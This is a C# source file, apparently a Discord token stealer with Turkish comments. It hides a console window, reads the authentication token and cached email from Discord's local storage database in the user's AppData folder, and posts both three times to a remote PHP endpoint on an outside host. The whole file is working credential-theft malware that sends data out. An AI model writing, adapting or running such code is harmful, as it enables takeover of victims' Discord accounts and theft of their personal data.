using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace discord
{

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {

            IntPtr hWnd = FindWindow(null, "Pencere Basligi");

            if (hWnd != IntPtr.Zero)
            {
                //Pencereyi gizle
                ShowWindow(hWnd, 0); // 0 = SW_HIDE
            }
            string rota = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\https_discordapp.com_0.localstorage";
            if (File.Exists(rota))
            {
                
                //Console.WriteLine("dosya bulundu");
                SQLiteConnection m_dbConnection;
                m_dbConnection =new SQLiteConnection("Data Source="+rota+";Version=3;");
                m_dbConnection.Open();
                string sql = "select key,value from ItemTable where key LIKE 'token'";
                SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
                SQLiteDataReader reader = command.ExecuteReader();
                string b="",c="";
                while (reader.Read())
                {
                     b= GetString((byte[])reader["value"]);
                    
                }
                string sqll = "select key,value from ItemTable where key LIKE 'email_cache'";
                SQLiteCommand commandd = new SQLiteCommand(sqll, m_dbConnection);
                SQLiteDataReader readerr = commandd.ExecuteReader();
                while (readerr.Read())
                {
                    c = GetString((byte[])readerr["value"]);

                }

                //Console.WriteLine("token: "+b+" mail "+c);
                m_dbConnection.Close();
                for(int i=0;i<3;i++)
                phppost(b,c.Trim('"'));
            }
            //Console.WriteLine("dosya bulunamadı");
            //Console.ReadLine();
        }
        static string GetString(byte[] bytes)
        {
            char[] chars = new char[bytes.Length / sizeof(char)];
            System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
            return new string(chars);
        }
        static string phppost(string token, string mail)
        {
            string URL = "http://cracktool.altervista.org/test.php";
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["parametre1"] = token;
            formData["parametre2"] = mail;
            byte[] responseBytes = webClient.UploadValues(URL, "POST", formData);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            string response = responsefromserver.Trim();
           
            webClient.Dispose();
            return response;
        }

    }
}
